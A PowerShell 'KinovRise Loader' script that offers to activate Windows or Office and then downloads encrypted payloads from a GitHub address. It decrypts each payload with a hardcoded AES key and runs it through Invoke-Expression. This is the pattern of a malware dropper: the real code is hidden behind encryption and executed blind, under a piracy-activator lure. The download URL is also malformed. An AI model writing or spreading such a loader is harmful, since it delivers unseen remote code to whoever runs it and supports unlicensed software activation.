# English menu, strong error handling, and decode AES-256

$menu = @(
    @{Name="Activate Windows"; EncFile="Active-Windows.enc"},
    @{Name="Activate Office";  EncFile="Active-Office.enc"},
    @{Name="KinovRise Tool";   EncFile="KinovRise.enc"}
)

Write-Host "========= KinovRise Loader ========="
for ($i=0; $i -lt $menu.Count; $i++) {
    Write-Host ("({0}) {1}" -f ($i+1), $menu[$i].Name)
}
$choice = Read-Host "Select a function (1-${($menu.Count)})"
if ($choice -notmatch '^[1-3]$') { Write-Host "Invalid selection! Exiting."; exit }
$encUrl = "https://github.com/ranusTeam41/kinovrise/main" + $menu[$choice-1].EncFile

$key = "j5rD4N!8xQw@2eTfZlVmAsYuGkLpOiRe" # Must be exactly 32 characters

try {
    $enc = Invoke-RestMethod -Uri $encUrl
    if ([string]::IsNullOrEmpty($enc)) { throw "Encrypted file is empty or missing!" }
    $raw = [Convert]::FromBase64String($enc)
    $iv = $raw[0..15]
    $data = $raw[16..($raw.Length-1)]
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = [Text.Encoding]::UTF8.GetBytes($key)
    $aes.IV = $iv
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($data, 0, $data.Length)
    Invoke-Expression ([Text.Encoding]::UTF8.GetString($plaintext))
} catch {
    Write-Host "ERROR: Failed to download or decrypt the script. Please check:" -ForegroundColor Red
    Write-Host " - Your internet connection"
    Write-Host " - That the encrypted file exists on GitHub"
    Write-Host " - That the decryption key is correct and matches the encryption key"
    Write-Host "Details: $_"
}
